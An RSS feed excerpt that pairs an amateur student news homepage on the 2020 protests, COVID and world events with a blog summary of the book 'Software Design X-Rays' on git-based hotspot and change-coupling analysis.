            <link>https://www.4alltech.com/2020/07/when-does-ps5-appear-what-hardware-will.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23741507</guid>
            <pubDate>Sun, 05 Jul 2020 20:09:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Thinker]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23741488">thread link</a>) | @TheThinkerCEO
<br/>
July 5, 2020 | http://barisciencelab.tech/TheThinker.html | <a href="https://web.archive.org/web/*/http://barisciencelab.tech/TheThinker.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
 
  <!--<div id="preloader"></div>-->
    <!--<div id="content">-->

      

 <!--
 <script src="//code.jquery.com/jquery.min.js"></script>
<script>
$.get("ThinkMenu.html", function(data){
    $("#nav-placeholder").replaceWith(data);
});
</script>
 
 
 
 <div id="nav-placeholder"></div>
 -->
 
 
      <nav role="navigation" aria-label="main navigation">



  



    
	   
	   
  <br>
    <!--<button class="button is-info" id="showModal" style = "margin-top:-2vh;">Apply</button>-->

	
	

	<!--
     <div class="navbar-item">
        <div class="buttons">
          <a class="button is-primary" href = "https://forms.gle/21Yp4J9h9v45uDcA8" >
            <strong>Apply</strong>
          </a>
        </div>
      </div>
      -->
  
</nav>
  
  <div>
  <center>
<div>
  <p><span><p>The Thinker</p></span>   

  </p>
  <p><span><p><span><a href="http://barisciencelab.tech/TheThinker.html"><img src="https://i.imgur.com/laASlTU.png" alt=""></a></span>
  </p></span>
</p></div>
    
    </center>
    
  </div>
 
 
      <section>
  <div>


<!--
 <div class = "columns fifty">
    <div class = "column is-12">-->
   <!--
    <article class = "title is-child blue" style = "padding: 2%;">
        <center>
        
        <h2 class = "post__title">Read in another Language: </h2>
        
        
        <div id="google_translate_element"></div>

        <script type="text/javascript">
        function googleTranslateElementInit() {
          new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
        }
        </script>
        
        <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
</center>
    </article>
    --><!--
    </div>
</div>-->

<!--
<section class="hero is-info" style = "margin-bottom:-5%;">
  <div class="hero-body">
    <div class="container">
      <h1 class="title appsnews">
        Congratulations!
      </h1>
      <h2 class="subtitle">
        <a href = "https://www.youtube.com/watch?v=1joMpCeueO0&t=994s"><b>Interviews here</b></a>. 11 Journalists have been accepted to <i>The Thinker</i>! Their Profiles will be released shortly. 
      </h2>
    </div>
  </div>
</section>-->



<br>
<div>
      <div>
        <article>
          <a href="">United States</a>

          <h2>NYPD Rams Car into Protestors</h2>
          <p>It was a tenous escalation of an already-tense relationship.</p>
          <figure>
    <img src="https://static.independent.co.uk/s3fs-public/thumbnails/image/2020/05/31/11/screenshot-2020-05-31-at-11.03.31-am.png?w968">
    <figcaption>
        Many have been accusing the police of excessive brutality towards protestors. The incident took place in Brooklyn, NY, on June 1, 2020
    </figcaption>
</figure>
        </article>
      </div>

 <div>
        <article>
          
          <h2><a href="http://barisciencelab.tech/06022020Interview.html">"Education, not Violence", pleads Black Student</a></h2>
                     

          <p>Ithaca University Student and KIPP H.S. Graduate Christian supports the protests, but condemns the looters, echoing Booker T. Washington's philosophy that Eduaction, not violence, is the path to reform.</p>
          <figure>
    <img src="https://i.imgur.com/tjHNu1z.png">
    <figcaption>
        "I know it's easy to loot when you see others doing it, but please -- Rise above that. You gotta set a model, an example for others to follow" - Christian Brown
    </figcaption>
</figure>
        
        </article>
      </div>

    <!--   <div class="tile is-parent">
        <article class="tile is-child green post oneman">
          <a class="post__category" href="">United States</a>
          <h2 class="post__title">George Floyd Protests</h2>
          <div class="post__content">Relationship between Law Enforcement and Protestors have found Floyd as the catalyst for their (mutually-self assured) destruction. The protests have unified and equally divided a nation tore in anger. We await to see developments such as whether the largest cities around the nation implement a curfew in this distressing time. </div>
        </article>
      </div>-->
    </div>
  <div>

      <div>
        <article>
                <p><span>LIVE</span>
                  <span id="headlineTime"></span>
                </p>
              
   
          <h2><a href="http://barisciencelab.tech/Judaism.html">Ruthless Against Judaists</a></h2>
         <p>Jews have faced many a crisis. From the Israeli Palestinian Conflicts to the Holocaust, and from Adam and Eve to Jacob, we dive into the history of the religion that has stood strong in times of need. Exactly what has this religion faced, and where are its origins? Take a look at the history of how they've been mistreated and tyrannized, and the causes of which thousands of children and adults have been martyred. Let's look at a different perspective, and love all religions, even if they aren't ours. Get ready to put yourself in the shoes of the Jews. </p>
            
            <figure>
    <img src="https://haam.org/wp-content/uploads/2019/02/860373-efade7b2-1d47-11e4-8adb-938012f29f27.jpg">
    <figcaption>
        Jews have been persecuted by many religions, races, and empires for years. They were first maltreated by the Arabs, then the Brits, and finally the Germans. Take a look at the history of how they've been mistreated and tyrannized, and the causes of which thousands of children and adults have been martyred. </figcaption>
</figure>


        </article>
        
      </div>

      <div>
        <article>
           
          <h2><a href="http://barisciencelab.tech/Heinz.html">A Battle to Live: Life or Law?</a></h2>
          <p>Once upon a time, there was a man named Mr. Heinz. He was a poor man; he only made a thousand bucks a year. He saved up every single penny he could after a while, and that got him to 3,575 bucks a year. But on the fifth night of February 1977, Mr. Heinz faced a heart-wrenching dilemma: should he save his wife or break the law?</p>
        
        </article>
        
        
        <article>
           
          <h2><a href="http://barisciencelab.tech/06072020Interview.html" onmouseover="this.style.color='#ab0808'" onmouseout="this.style.color='#ff0000'">"Trump is a tragedy", Columbia Scientist</a></h2>
          <p>They've lived through some of the greatest moments in History: the moon landing, the birth of the UN, UNICEF, and WHO, and witnessed some of its worst -- the Holocaust, Nazi Germany, and COVID19, to name just a few. Indeed, what the von Gutfelds have lived through is little short of remarkable: the Holocaust, Hitler, and now COVID. </p>
        
        </article>
      </div>
    </div>
    
    

    <!-- FIRST ROW -->
   <!--
   <div class = "columns one">
       <div class = "column is-6">
           
            <article class="tile is-child tealish post fiveman">
          <a class="post__category" href="">America</a>
          <h2 class="post__title"><a href = "06132020Interview.html">"People are worth more than buildings", Columbia Graduate</a></h2>
          <div class="post__content">At a time of National Crisis, how do we grapple with our own responsibilities? This is the question I myself struggle to answer every day. But it doesn't have to be so: As Jordan Mahr of Columbia University exclaims, the socio-moral responsibilities of today are simply a consequence of our nation's high standing on Maslow's Hierarchy of Needs. It is because of this shared prestige and rare privilege that we are afforded the oppurtunity adress these difficult issues in the first place. </div>
                <figure class="imghvr-fade" style = "margin-top:-2vh; margin-left:2%;">
    <img src="JordanMahr.png" style = "width:110%">
    <figcaption>
        Jordan Mahr graduated from Columbia University in Theatre last year, in 2020. He was born in New Jersey and studied Drama and Performance with a Concentration in Acting at Columbia University and trained at the Royal Academy of Dramatic Art.  
    </figcaption>
</figure>
        </article>
        
         
       </div>
    
     <div class="tile is-vertical is-parent">
            <article class="tile is-child red post">
          <a class="post__category" href="">Politics</a>
          <h2 class="post__title"><a href = "06072020Interview.html" style = "color: red;" onMouseOver="this.style.color='#ab0808'"
   onMouseOut="this.style.color='#ff0000'">"Trump is a tragedy", Columbia Scientist</a></h2>
          <div class="post__content">They've lived through some of the greatest moments in History: the moon landing, the birth of the UN, UNICEF, and WHO, and witnessed some of its worst -- the Holocaust, Nazi Germany, and COVID19, to name just a few. Indeed, what the von Gutfelds have lived through is little short of remarkable: the Holocaust, Hitler, and now COVID. I can only look in awe as Columbia Adjunct Senior Research Scientist von Gutfeld laments at the state of American Leadership during a time of global crisis, giving a scalding rebuke of Trump and his reaction the Pandemic and Protests.</div>
                <figure class="imghvr-fade" style = "margin-top:-3vh; margin-left:2%;">
    <img src="https://i.imgur.com/r0WasA0.png" style = "width:110%"></a>
    <figcaption>
        They've lived through some of the greatest moments in History: the moon landing, the birth of the UN, UNICEF, and WHO, and witnessed some of its worst -- the Holocaust, Nazi Germany, and COVID19, to name just a few. 
    </figcaption>
</figure>
        </article>
           
     
      </div>
    </div>
    -->
    
    <div>
       <div>
              
      
            <article>
          
          
          <h2><a href="http://barisciencelab.tech/GestaltSwitch.html">What do you see?</a></h2>
          <p>Superposition is impossible. I want to be in London and New York at the same time, but I can't -- reality prohibits me. By extension, one can't get a head and tail from the same coin flip; nor can we have day and night simulatenously. With this law in mind, I want to ask you a question. It has no right answer, but it will demonstrate your thinking.</p>
                <center><figure>
    <img src="http://brainden.com/images/optical-illusions-big.gif">
    <figcaption>
        Do you see a young lady or an ugly old woman? If you see the young lady, look corefally at the ears -- they're the eyes of the old lady. If you look at the picture long enough, you should experience a 'Gestalt Switch'.
    </figcaption>
</figure></center>
        </article>
        
       </div>
       <div>
                <article>
         
         
          <h2><a href="http://barisciencelab.tech/Dowry.html">The Danger of Dowry</a></h2>
          <p>Dowry is like a social disease in some South Asian countries such as Bangladesh, Pakistan and India. Everyday women become victims because of dowry violence. Most of the groom's family demands dowry from the bride's family. </p>
          
        </article>
         <article>
          
          
          <h2><a href="http://barisciencelab.tech/TheOriginalRelativist.html">Galileo: The Original Relativist</a></h2>
          <p>The Catholic Church took 350 years to concede that Galileo was indeed right that the Copernican Model of the Solar System was correct. This was in 1992, when the Pope formally closed the 13-year investigation into the Church's condemnation of the reknowned Scientist. </p>
        </article>
           </div>
   </div>

    <!-- SECOND ROW -->
    <div>
      <div>
        <article>
          
          <h2><a href="http://barisciencelab.tech/AMileWideAnInchDeep.html">A Mile Wide and an Inch Deep Curriculum</a></h2>
          <p>America is known for excellence in education. No wonder, America won 385 out of 860 Nobel Prizes in which Harvard and Columbia together won 250 Prizes that is 29% of total Prize. However, there is a problem: K-12 Education is in crisis, which led to an educational revolution, of which Common Core is the outcome.</p>
                <figure>
    <img src="https://images.collegexpress.com/article/test-prep-tips-tricks-strategies-taking-SAT-ACT.jpg">
    <figcaption>
        The Common Core is an educational program launched by the National Governors Associatoin (NGA) and the Council of Chief State School Officers (CCSSO). It was established in 2010 in a hope to create a national, uniform cirriculum in Mathematics and Science.    </figcaption>
</figure>
        </article>
      </div>

      <div>
        <article>
          
          <h2><a href="http://barisciencelab.tech/06042020Interview.html" onmouseover="this.style.color='white'" onmouseout="this.style.color='white'">"It's all good", shouts Sikh</a></h2>
          <p>Mr. Ranbir, retired construction worker and evergreen optimist, hails from Punjab, India. "I love everybody", he says in broken English. "They say, 'we no like Muslims'. But no, I love everyone. Muslims, Hindu, Christian, everybody, everybody.".</p>
        </article>
        
        
        <article>
          <a href="">Science</a>
          <h2>The Story of SpaceX</h2>
          <p>Third time wasn't the charm for the now-nationally admired commercial space organization.</p>
        
        </article>
      </div>

      
    </div>

    <!-- THIRD ROW -->
    <div>
      <div>
        <div>
          <div>
            <article>
              <a href="">United States</a>
              <h2>A Nation in Distress</h2>
              <p>What does it take to break a nation? A democracy? The richest in the world? Now we know: a 7 mm virus and racism. These two make a dangerous combustion that mix the fire and fury of a nation tore down.</p>
          
            </article>
          </div>
          <div>
            <article>
              <a href="">India</a>
              <h2>The State of India</h2>
              <p>India is in a truly unique crisis: hunger has ravaged the poor, most of whom work in the informal economy. And the informal economy is more than 90% of India's economy, making the effects of unemployment all the more worse. </p>
            
            </article>
          </div>
          
          
          <div>
            <article>
              <a href="">Bangladesh</a>
              <h2>Hurricane Amphan Tears Bangladesh</h2>
              <p>She was at the height of her career when COVID19, Poverty, Hunger, Unemployment, and a killer Hurricane all struck at once. Will the eight largest nation in the world persevere as it did in 1974? Or will it fall to an untimely death?</p>
            
            </article>
          </div>
        </div>

        <div>
          <div>
            <article>
              <a href="">Women</a>
              <h2>A Mother's Worry</h2>
              <p>Lockdowns worldwide are still in-effect in many countries, and this has caused domestic abuse cases to shoot up. In addition, how can mothers and fathers alike educate their children during this time of remote learning?</p>
          
            </article>
          </div>
          <div>
            <article>
              <a href="">Science</a>
              <h2>The Galilean Man</h2>
              <p>For much of the 19th century, Galilean Transformations were the way to go to identify observers, events, and movements across space-time. Let's try to understand the theory behind it all.</p>
            
            </article>
          </div>
        </div>
      </div>

      <div>
        <article>
          <a href="">Pakistan</a>
          <h2>A Crash in Pakistan</h2>
          <p>The plane was traveling from Lahore to Karachi, when it crashed, killing 97 of 99 people aboard. 2 survivors recount their horror stories in their memorable encounter with death. COVID19 has uniquely affected the aviation industry, and although this is mere speculation -- the crash in Pakistan is most likely to exacerbate the problems. </p>
            <figure>
    <img src="https://gumlet.assettype.com/nationalherald%2F2020-05%2Fe05d32e5-62c5-4455-b04d-fcf24b0d955f%2Fpak_plane.jpg?rect=0%2C0%2C720%2C405&amp;auto=format%2Ccompress&amp;format=webp&amp;w=750&amp;dpr=1.0">
    <figcaption>
        The plane was heading from Lahore to Karachi, and crashed killing 97 of the 99 people aboard, including children.
    </figcaption>
</figure>
          
                      <figure>
    <img src="https://specials-images.forbesimg.com/imageserve/1196884876/960x0.jpg?fit=scale">
    <figcaption>
        In Pakistan, planes don't have to undergo background checks prior to flying, which may be one of the many factors contributing to the crash of the flight.
    </figcaption>
</figure>
        </article>
      </div>
    </div>

  </div>
  <!-- /container -->
</section>
<!--      
<div class="fancy-hr"><hr></div>

<center><p class="title is-3" width = "">From the Editor-In-Chief</p></center>
      
<center>      
<div class="fancy-hr"><hr></div>

 <div class="container" style = "width:50vw; height: 55vh;">
	<div id="player" data-plyr-provider="youtube" data-plyr-embed-id="-9lQ_CbCetw"></div>
</div>
          </center>-->


<center><p>Good News</p></center>
      
      

      <section>
  <div>
    <p>
      
      <h2>
        SpaceX Dragon succesfully 'soft-docked' with the ISS 
      </h2>
    </p>
    <br>
  </div>
  
</section>
      
      
      <section>
 
  

</section>

<div>
    <p>
      Brooklyn and Manhattan have been the center of most of the protests occuring in New York City. Queens has also recently erupted in protests driven by the death of George Floyd. Protests have recently escalated even further, reaching into violent territory: police have literally driven cars into protestors; protestors have lit police cars on fire, in return, and the whole city seems to be descending into the stages of preliminary stages of anarchy.
      </p>
    
    
</div>

            
      
      
        <section>
    <div>
      <div>
        <div>
          <div>
            <div>
              <figure>
                <img src="https://static01.nyt.com/newsgraphics/2020/05/29/floyd-protests-map/assets/images/ny-brooklyn-0530-1440.jpg" alt="a random image">
              </figure>
            </div>
            <div>
              <p>A Microcosm of the Future</p>
              <p>Are the riots, looting, and protests of America Today a sign of America from the future? But things have only been getting started. A problem much larger than COVID19 is emerging, and that is Global Warming. It is so existential that we have a hard time thinking about it, and thus acting on that fear. It is essential that we understand the present, should we hope to anticipate the future. </p>
            </div>
            
          </div>
        </div>
        <div>
          <div>
            <div>
              <figure>
                <img src="https://images.indianexpress.com/2020/05/dharavi-1-3.jpg" alt="a random image">
              </figure>
            </div>
            <div>
              <p>Dharavi of the Now</p>
              <p>This is one of the densest regions in the entire world. Back in the '70s, anyone with two sticks and a hand could call Dharavi …</p></div></div></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://barisciencelab.tech/TheThinker.html">http://barisciencelab.tech/TheThinker.html</a></em></p>]]>
            </description>
            <link>http://barisciencelab.tech/TheThinker.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23741488</guid>
            <pubDate>Sun, 05 Jul 2020 20:05:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The key points of Software Design X-Rays]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 4 (<a href="https://news.ycombinator.com/item?id=23741261">thread link</a>) | @nicoespeon
<br/>
July 5, 2020 | https://understandlegacycode.com/blog/key-points-of-software-design-x-rays/ | <a href="https://web.archive.org/web/*/https://understandlegacycode.com/blog/key-points-of-software-design-x-rays/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>How do you analyze a very large Legacy codebase?</p><p>Where do you start when your system is distributed across dozens of micro-services?</p><p>How do you identify development bottlenecks and prioritize refactoring?</p><p>In his book <!-- -->[Software Design X-Rays]<!-- -->(<a href="https://www.google.com/search?q=software+design+x-rays&amp;oq=soft">https://www.google.com/search?q=software+design+x-rays&amp;oq=soft</a>, Adam Tornhill presents a very unique approach to answer these questions. It’s a mix of software architecture and human psychology that generates powerful techniques to tackle large codebases.</p><p>Yet, I realized it’s not a very known book.</p><blockquote><p>I’ve read <a href="https://www.google.com/search?q=your+code+as+a+crime+scene">Your Code as a Crime Scene</a> from the same guy. How is this different?</p></blockquote><p>Well, “Software Design X-Rays” was written after “Your Code as a Crime Scene”. While the forensics flavor of the book was fun and all, Adam stopped referring it too much to avoid getting the reader distracted. The content is much more polished!</p><p>Let me give you my summary of what’s inside the book and why I think it can help you:</p><h2 id="tackle-technical-debt-with-behavioral-code-analysis"><a href="#tackle-technical-debt-with-behavioral-code-analysis" aria-label="tackle technical debt with behavioral code analysis permalink"></a>Tackle Technical Debt with Behavioral Code Analysis</h2><p>The book focuses on giving you the answers to these 3 questions:</p><ol><li>Where’s the code with the higher interest rate?</li><li>Does your architecture support the way your system evolves?</li><li>Are there any productivity bottlenecks for inter-team coordination?</li></ol><p>To do so, Adam presents a technique called <strong>Behavioral Code Analysis</strong>. It uses the information contained in your Version Control System (VCS) to help you make smart decisions on large codebases.</p><h3 id="identify-your-system-hotspots"><a href="#identify-your-system-hotspots" aria-label="identify your system hotspots permalink"></a>Identify your system Hotspots</h3><p>Technical Debt isn’t really a problem if you don’t have to maintain it.</p><p>Static analysis tools consider all debt to be equivalent. They report countless of code smells that you have no choice but to focus on the critical ones. Still, that leaves plenty of things to clean up!</p><p>That’s why you should use the time dimension to identify <strong>Hotspots</strong>: places where you should focus the Refactor efforts in a large codebase if you want to be super effective.</p><p><undefined>
  <a href="https://understandlegacycode.com/static/019e5f99d9ed31fd581770a1835f8ba1/4cf67/hotspots.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="hotspots" title="" src="https://understandlegacycode.com/static/019e5f99d9ed31fd581770a1835f8ba1/4cf67/hotspots.png" srcset="https://understandlegacycode.com/static/019e5f99d9ed31fd581770a1835f8ba1/00d96/hotspots.png 148w,https://understandlegacycode.com/static/019e5f99d9ed31fd581770a1835f8ba1/0b23c/hotspots.png 295w,https://understandlegacycode.com/static/019e5f99d9ed31fd581770a1835f8ba1/4cf67/hotspots.png 572w" sizes="(max-width: 572px) 100vw, 572px">
    </span>
  </span>
  
  </a>
    </undefined></p><p><undefined>
  <a href="https://understandlegacycode.com/static/00cdf44baa120d7c01e6f6c9536df456/11d19/code-that-matters.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="code that matters" title="" src="https://understandlegacycode.com/static/00cdf44baa120d7c01e6f6c9536df456/799d3/code-that-matters.png" srcset="https://understandlegacycode.com/static/00cdf44baa120d7c01e6f6c9536df456/00d96/code-that-matters.png 148w,https://understandlegacycode.com/static/00cdf44baa120d7c01e6f6c9536df456/0b23c/code-that-matters.png 295w,https://understandlegacycode.com/static/00cdf44baa120d7c01e6f6c9536df456/799d3/code-that-matters.png 590w,https://understandlegacycode.com/static/00cdf44baa120d7c01e6f6c9536df456/11d19/code-that-matters.png 800w" sizes="(max-width: 590px) 100vw, 590px">
    </span>
  </span>
  
  </a>
    </undefined></p><p>If you want to learn how to generate and use these, I presented the technique in details:</p><ul><li><a href="https://understandlegacycode.com/blog/focus-refactoring-with-hotspots-analysis">Focus refactoring on what matters with Hotspots Analysis</a></li><li><a href="https://understandlegacycode.com/blog/convince-management-to-address-tech-debt-with-enclosure-diagrams">Convince managers to address Tech Debt with Enclosure Diagrams</a></li></ul><p>Interestingly, hotspots tend to stay here because people are afraid to tackle them. So they attract even more complexity and become problematic bottlenecks.</p><h3 id="loc-a-simple-and-efficient-indicator-of-code-complexity"><a href="#loc-a-simple-and-efficient-indicator-of-code-complexity" aria-label="loc a simple and efficient indicator of code complexity permalink"></a>LOC: a simple and efficient indicator of code complexity</h3><p>When it comes to evaluating the complexity of the code, many metrics compete. The most popular is probably Cyclomatic Complexity. Yet, it’s fascinating to see that the count of Lines Of Code (LOC) is often a <em>good enough</em> indicator!</p><p>As it’s a language-neutral metric, it’s very easy to generate regardless of your language tooling. You can use <a href="http://cloc.sourceforge.net/">cloc</a> for that:</p><pre data-language="bash" data-index="0"><p><code><span><span>cloc </span><span>.</span><span> --csv --quiet --report-file=your_project.csv</span></span></code></p></pre><p>Another language-neutral metric that works well is the <strong>Indentation Level</strong>. Indentation carries the meaning of logical splits. That’s a good indicator that code is complex.</p><p>The limit of using these is when you have a change in the coding style in the history of the project. But because these metrics are simple, it makes no sense to look at specific values and thresholds. <strong>It’s the trend that matters</strong>. That’s usually enough.</p><h3 id="evaluate-hotspots-with-complexity-trends"><a href="#evaluate-hotspots-with-complexity-trends" aria-label="evaluate hotspots with complexity trends permalink"></a>Evaluate Hotspots with Complexity Trends</h3><p>If you analyze the evolution of complexity of a file over time, you get the story of that file:</p><p><undefined>
  <a href="https://understandlegacycode.com/static/cb402f296f7492bb21a7edeee345b91e/48606/complexity-trend.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="complexity trend" title="" src="https://understandlegacycode.com/static/cb402f296f7492bb21a7edeee345b91e/799d3/complexity-trend.png" srcset="https://understandlegacycode.com/static/cb402f296f7492bb21a7edeee345b91e/00d96/complexity-trend.png 148w,https://understandlegacycode.com/static/cb402f296f7492bb21a7edeee345b91e/0b23c/complexity-trend.png 295w,https://understandlegacycode.com/static/cb402f296f7492bb21a7edeee345b91e/799d3/complexity-trend.png 590w,https://understandlegacycode.com/static/cb402f296f7492bb21a7edeee345b91e/48606/complexity-trend.png 701w" sizes="(max-width: 590px) 100vw, 590px">
    </span>
  </span>
  
  </a>
    </undefined></p><p>That’s helpful to show the impact of refactoring to non-technical managers. That helps them visually see the effects of such work, and the results on team productivity.</p><h3 id="perform-x-rays-analysis-to-narrow-even-deeper"><a href="#perform-x-rays-analysis-to-narrow-even-deeper" aria-label="perform x rays analysis to narrow even deeper permalink"></a>Perform X-Rays analysis to narrow even deeper</h3><p>Once you identified Hotspots, you can apply the same logic at the file level to find the complex functions:</p><p><undefined>
  <a href="https://understandlegacycode.com/static/2e63aa78e40f6496f17d737b9ead73c8/11d19/x-ray.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="x ray" title="" src="https://understandlegacycode.com/static/2e63aa78e40f6496f17d737b9ead73c8/799d3/x-ray.png" srcset="https://understandlegacycode.com/static/2e63aa78e40f6496f17d737b9ead73c8/00d96/x-ray.png 148w,https://understandlegacycode.com/static/2e63aa78e40f6496f17d737b9ead73c8/0b23c/x-ray.png 295w,https://understandlegacycode.com/static/2e63aa78e40f6496f17d737b9ead73c8/799d3/x-ray.png 590w,https://understandlegacycode.com/static/2e63aa78e40f6496f17d737b9ead73c8/11d19/x-ray.png 800w" sizes="(max-width: 590px) 100vw, 590px">
    </span>
  </span>
  
  </a>
    </undefined></p><p>This is what Adam calls “X-Ray analysis”. Here’s the rough recipe:</p><ol><li>Fetch the source code of the file for each revision from Git</li><li>Run a <code>git diff</code> for every revision to list the modifications</li><li>Match the <code>diff</code> results to the functions that existed in this version (parsing the code is necessary here)</li><li>Perform a Hotspot calculation for the functions<ul><li>Change Frequency = times a function was changed</li><li>Complexity = length or indentation level of the function</li><li>Combine them to calculate the score</li></ul></li></ol><p><undefined>
  <a href="https://understandlegacycode.com/static/2dd2ea002e1ba78bc3e7234740b86379/e7347/x-ray-results.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="x ray results" title="" src="https://understandlegacycode.com/static/2dd2ea002e1ba78bc3e7234740b86379/799d3/x-ray-results.png" srcset="https://understandlegacycode.com/static/2dd2ea002e1ba78bc3e7234740b86379/00d96/x-ray-results.png 148w,https://understandlegacycode.com/static/2dd2ea002e1ba78bc3e7234740b86379/0b23c/x-ray-results.png 295w,https://understandlegacycode.com/static/2dd2ea002e1ba78bc3e7234740b86379/799d3/x-ray-results.png 590w,https://understandlegacycode.com/static/2dd2ea002e1ba78bc3e7234740b86379/e7347/x-ray-results.png 849w" sizes="(max-width: 590px) 100vw, 590px">
    </span>
  </span>
  
  </a>
    </undefined></p><p>With the Hotspot + X-Ray techniques, you can take a 400kLOC codebase and focus on the few hundred lines of code that will have the most impact if they are refactored.</p><p>It’s good to know you can perform a cheap X-Ray with git log, using the <code>-L</code> option:</p><pre data-language="bash" data-index="1"><p><code><span><span>git log -L:intel_crtc_page_flip:drivers/gpu/drm/i915/intel_display.c</span></span></code></p></pre><h2 id="coupling-in-time-where-surprises-happen"><a href="#coupling-in-time-where-surprises-happen" aria-label="coupling in time where surprises happen permalink"></a>Coupling in Time: where surprises happen</h2><p>You generally forget about the time dimension when you analyze the code to evaluate its design. That’s a mistake! <strong>Change Coupling</strong> is when files change together over time.</p><p><undefined>
  <a href="https://understandlegacycode.com/static/772eb927f6f8cbe7cc9a4f933ac7d6fd/3af27/change-coupling.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="change coupling" title="" src="https://understandlegacycode.com/static/772eb927f6f8cbe7cc9a4f933ac7d6fd/3af27/change-coupling.png" srcset="https://understandlegacycode.com/static/772eb927f6f8cbe7cc9a4f933ac7d6fd/00d96/change-coupling.png 148w,https://understandlegacycode.com/static/772eb927f6f8cbe7cc9a4f933ac7d6fd/0b23c/change-coupling.png 295w,https://understandlegacycode.com/static/772eb927f6f8cbe7cc9a4f933ac7d6fd/3af27/change-coupling.png 545w" sizes="(max-width: 545px) 100vw, 545px">
    </span>
  </span>
  
  </a>
    </undefined></p><p>2 files might change together accidentally. But if they changed together in many commits, with a high degree of coupling, then there’s a high chance these 2 files are coupled!</p><p>This allows you to identify things that empirically belong together. If these files are not co-located, then there might be a problem with the current design. Maybe there’s a bad abstraction or maybe there’s copy-pasted code that keeps evolving together.</p><p>Expected coupling:</p><ul><li>highly-cohesive files (same module)</li><li>code &amp; tests</li></ul><p>Unexpected coupling:</p><ul><li>low-cohesive files (different modules)</li><li>surprising relationships</li></ul><p>Since you’re using git metadata to determine these coupling, it’s <strong>language agnostic</strong>. Therefore, you can detect coupling across stacks, like between front-end and back-end.</p><p>A limit of this technique is the commit patterns developers use. If a developer always commits tests and code independently, you can adapt the technique and consider commits from the same author in a 24h sliding window as “coupled together”. Usually, that’s good enough.</p><h3 id="identify-actual-code-duplication"><a href="#identify-actual-code-duplication" aria-label="identify actual code duplication permalink"></a>Identify actual code duplication</h3><p>Copy-paste is not bad in itself.</p><p>It’s only bad if you need to keep changing all occurrences together. Hence, if you integrate a metric of <em>Similarity</em> in your Change Coupling analysis, you can detect problematic copy-paste:</p><p><undefined>
  <a href="https://understandlegacycode.com/static/33313f1bcd8d42c2f66ef8fd55ac3875/388a9/change-coupling-copy-paste.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="change coupling copy paste" title="" src="https://understandlegacycode.com/static/33313f1bcd8d42c2f66ef8fd55ac3875/799d3/change-coupling-copy-paste.png" srcset="https://understandlegacycode.com/static/33313f1bcd8d42c2f66ef8fd55ac3875/00d96/change-coupling-copy-paste.png 148w,https://understandlegacycode.com/static/33313f1bcd8d42c2f66ef8fd55ac3875/0b23c/change-coupling-copy-paste.png 295w,https://understandlegacycode.com/static/33313f1bcd8d42c2f66ef8fd55ac3875/799d3/change-coupling-copy-paste.png 590w,https://understandlegacycode.com/static/33313f1bcd8d42c2f66ef8fd55ac3875/388a9/change-coupling-copy-paste.png 681w" sizes="(max-width: 590px) 100vw, 590px">
    </span>
  </span>
  
  </a>
    </undefined></p><p>Fixing code duplication is often a quick win. It helps getting started in refactoring a Hotspot.</p><p>As a rule of thumb: <strong>things that are coupled should be co-located</strong>.</p><h2 id="the-principles-of-code-age"><a href="#the-principles-of-code-age" aria-label="the principles of code age permalink"></a>The Principles of Code Age</h2><p>Code is only desirable in 2 states:</p><ol><li>Very recent, because it’s fresh in your mind</li><li>Very old, because it means it has stabilized</li></ol><p>When you meet a very old code, you can encapsulate that into a library and extract it from your codebase. That’s less code to deal with, which is good for developers and onboarding!</p><p><strong>Old code usually has no bugs.</strong></p><p>A code that doesn’t stabilize is problematic. It usually means you need to patch it. Because you don’t know it very well, there’s a high chance of creating bugs by ignorance. By creating more bugs, you need to update the code again: it doesn’t stabilize.</p><h3 id="calculate-the-age-of-code"><a href="#calculate-the-age-of-code" aria-label="calculate the age of code permalink"></a>Calculate the age of code</h3><p>The algorithm is simple:</p><ol><li>List modified files with <code>git ls-files</code></li><li>Get the last modification date for each file with <code>git log -l --format="%ad" --date=short -- path/to/file</code></li><li>Calculate the age of the file</li></ol><p>If the codebase was not maintained for some time, consider the youngest one to be 0.</p><h3 id="refactor-towards-code-of-similar-age"><a href="#refactor-towards-code-of-similar-age" aria-label="refactor towards code of similar age permalink"></a>Refactor towards code of similar age</h3><p>Within the same packages, you can identify the code of different ages (very old AND very recent). Try to understand why some code fails to stabilize.</p><p>Maybe you’ll be able to extract parts of it that would actually stabilize.</p><p>Maybe you’ll identify different concepts that are mixed. So you can refactor the structure of the code:</p><p><undefined>
  <a href="https://understandlegacycode.com/static/54ecf644a3270956bb2619a3ed374ec2/fed2b/architecture.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="architecture" title="" src="https://understandlegacycode.com/static/54ecf644a3270956bb2619a3ed374ec2/fed2b/architecture.png" srcset="https://understandlegacycode.com/static/54ecf644a3270956bb2619a3ed374ec2/00d96/architecture.png 148w,https://understandlegacycode.com/static/54ecf644a3270956bb2619a3ed374ec2/0b23c/architecture.png 295w,https://understandlegacycode.com/static/54ecf644a3270956bb2619a3ed374ec2/fed2b/architecture.png 564w" sizes="(max-width: 564px) 100vw, 564px">
    </span>
  </span>
  
  </a>
